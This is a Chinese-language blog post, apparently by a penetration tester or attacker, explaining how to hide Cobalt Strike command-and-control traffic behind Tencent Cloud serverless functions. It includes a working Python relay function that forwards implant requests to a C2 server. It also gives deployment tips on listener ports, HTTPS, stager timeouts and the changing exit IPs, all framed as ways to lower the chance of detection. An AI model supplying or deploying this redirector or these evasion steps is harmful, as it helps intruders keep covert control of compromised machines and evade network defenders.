NO.1 背景介绍

1、裸奔c2变成跑马场，需要一种快速、简单、低成本的方式帮我隐藏c2流量

2、域前置、cdn等手段已经较为成熟，所以各厂商的针对手段也日渐多样，而且像cloudflare等云厂商已经开始禁用域前置，门槛逐步提高

3、正巧所使用的vps提供了云函数转发的功能

4、使用一年，每月免费40万GBs/100万次请求次数



NO.2 创建流程

配置过程全程傻瓜式，截止到这篇文章写完网上已经有相当多的教程了，跟着走一遍就好了

有几位前辈在测试的时候发现cs4.0不支持执行命令，但是我在测试过程中还是成功在cs4.0上成功了，这边提前说明一下

因为我用的是腾讯云，所以这边就讲一下腾讯云的创建流程
* 腾讯云控制台搜索“云函数”；点击左侧的“函数服务”，新建一个云函数

函数内容：

# coding: utf8import json,requests,base64def main_handler(event, context):   response = {}   path = None   headers = None   try:       C2='http://x.x.x.x:port'       if 'path' in event.keys():           path=event['path']       if 'headers' in event.keys():           headers=event['headers']       if 'httpMethod' in event.keys() and event['httpMethod'] == 'GET' :           resp=requests.get(C2+path,headers=headers,verify=False)        else:           resp=requests.post(C2+path,data=event['body'],headers=headers,verify=False)           print(resp.headers)           print(resp.content)       response={           "isBase64Encoded": True,           "statusCode": resp.status_code,           "headers": dict(resp.headers),           "body": str(base64.b64encode(resp.content))[2:-1]      }   except Exception as e:       print('error')       print(e)   finally:       return response

· 然后正常做马上线

这里可以看到，4.0版本可以同样上线执行命令

· 本地抓包分析，流量都为腾讯云流量




NO.3 总结

· 一个监听器需要一个云函数，但是比较尴尬的地方在于云函数默认只能走80和443，所以监听器也只能设置为这两个端口上

· 云函数自带一层cdn，所以上线后的外网IP会一直变化

· 在设置https的监听器时记得把转发URL写成hxxps://x.x.x.x

· 如果需要使用自己申请的https证书，就需要在profile里进行修改

· 云函数的超时时间不宜设置过小，stager下发命令会需要一定的时间

· 总的来说降低了c2被发现的风险，但是溯源还是有迹可循的，如果需要更完美的隐藏自己请配合多种技术多多实践～
